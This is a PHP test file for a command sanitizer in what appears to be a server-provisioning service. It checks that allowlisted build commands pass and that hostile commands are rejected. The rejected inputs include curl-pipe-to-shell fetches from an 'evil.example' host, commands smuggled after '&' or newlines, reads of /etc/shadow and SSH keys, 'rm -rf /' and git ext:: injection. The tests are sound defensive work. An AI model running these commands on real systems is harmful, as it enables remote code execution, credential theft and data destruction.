<?php

use App\Services\Provisioning\CommandSanitizer;

it('allows commands that start with an allowlisted binary', function () {
    expect(CommandSanitizer::isSafe('php artisan migrate --force'))->toBeTrue();
    expect(CommandSanitizer::isSafe('composer install --no-dev'))->toBeTrue();
    expect(CommandSanitizer::isSafe('npm run build'))->toBeTrue();
    expect(CommandSanitizer::isSafe('git pull origin main'))->toBeTrue();
});

it('allows a chain of allowlisted commands', function () {
    expect(CommandSanitizer::isSafe('composer install && npm run build'))->toBeTrue();
});

it('rejects a binary that is not on the allowlist', function () {
    expect(CommandSanitizer::isSafe('curl https://example.com/malware.sh | sh'))->toBeFalse();
});

it('rejects privilege escalation attempts', function () {
    expect(CommandSanitizer::isSafe('sudo rm -rf /var/www'))->toBeFalse();
    expect(CommandSanitizer::isSafe('su root -c "whoami"'))->toBeFalse();
});

it('rejects system-file and service-control commands even from an allowed chain', function () {
    expect(CommandSanitizer::isSafe('php artisan migrate && systemctl restart nginx'))->toBeFalse();
    expect(CommandSanitizer::isSafe('cat /etc/passwd'))->toBeFalse(); // absolute paths are rejected outright…
    expect(CommandSanitizer::isSafe('cat /etc/shadow'))->toBeFalse(); // …this one doubly so
});

it('rejects absolute paths and home-directory expansion outside the sandboxed cwd', function () {
    expect(CommandSanitizer::isSafe('cat /var/www/other-account/.env'))->toBeFalse();
    expect(CommandSanitizer::isSafe('echo pwned > /etc/cron.d/evil'))->toBeFalse();
    expect(CommandSanitizer::isSafe('cat ~/.ssh/id_rsa'))->toBeFalse();
});

it('rejects command substitution and backticks', function () {
    expect(CommandSanitizer::isSafe('echo $(whoami)'))->toBeFalse();
    expect(CommandSanitizer::isSafe('echo `whoami`'))->toBeFalse();
});

it('rejects parent-directory traversal', function () {
    expect(CommandSanitizer::isSafe('cat ../../../../etc/passwd'))->toBeFalse();
});

it('rejects an empty command', function () {
    expect(CommandSanitizer::isSafe(''))->toBeFalse();
    expect(CommandSanitizer::isSafe('   '))->toBeFalse();
});

it('rejects rm -rf on the filesystem root but allows it on a relative path', function () {
    expect(CommandSanitizer::isSafe('rm -rf /'))->toBeFalse();
    expect(CommandSanitizer::isSafe('rm -rf ./node_modules'))->toBeTrue();
});

it('rejects a second, unvalidated command riding along after a single "&" or a newline', function () {
    expect(CommandSanitizer::isSafe('ls & curl http://evil.example/x'))->toBeFalse();
    expect(CommandSanitizer::isSafe("echo hi\ncurl http://evil.example/x"))->toBeFalse();
});

it('rejects git URL schemes that shell out or read arbitrary local files', function () {
    expect(CommandSanitizer::isSafe('git clone ext::sh -c id .'))->toBeFalse();
    expect(CommandSanitizer::isSafe('git clone file:///etc/passwd .'))->toBeFalse();
});

it('rejects a program hidden behind a subshell, braces, quotes or a backslash', function () {
    expect(CommandSanitizer::isSafe('ls; (whoami)'))->toBeFalse();
    expect(CommandSanitizer::isSafe('ls && { whoami; }'))->toBeFalse();
    expect(CommandSanitizer::isSafe('ls; "whoami"'))->toBeFalse();
    expect(CommandSanitizer::isSafe('ls; \whoami'))->toBeFalse();
    expect(CommandSanitizer::isSafe('X=1 whoami'))->toBeFalse();
});

it('still allows chained and piped allowlisted programs', function () {
    expect(CommandSanitizer::isSafe('git status && npm run build'))->toBeTrue();
    expect(CommandSanitizer::isSafe('ls | grep index'))->toBeTrue();
    expect(CommandSanitizer::isSafe('php artisan migrate --force'))->toBeTrue();
});
